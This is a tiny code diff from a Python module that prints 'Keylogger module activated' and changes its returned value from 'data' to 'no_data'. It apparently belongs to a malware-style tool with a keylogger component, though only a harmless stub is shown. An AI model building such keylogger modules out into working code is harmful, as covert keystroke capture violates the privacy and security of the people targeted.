@@ -143,7 +143,7 @@ def run():
 
     print("[+] Keylogger module activated...")
 
-    return_data = "data"
+    return_data = "no_data"
     next_action = "instructions"
     return return_data, next_action
 
